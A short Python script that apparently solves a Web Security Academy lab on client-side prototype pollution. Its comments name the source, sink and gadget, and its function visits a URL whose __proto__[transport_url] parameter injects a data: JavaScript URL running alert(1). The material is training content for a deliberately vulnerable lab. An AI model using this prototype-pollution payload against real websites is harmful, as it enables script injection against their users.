from web_security_academy.core.logger import logger

# Source:   `window.location`
# Sink:     `deparam` function defined in `/resources/js/deparam.js`
# Gadget:   `transport_url` property of `config` variable defined in
#           `/resources/js/searchLogger.js`


def solve_lab(session):
    path = "/?__proto__[transport_url]=data:text/javascript,alert(1)"
    logger.info(f"Visiting `{path}`...")
    session.get_path(path)
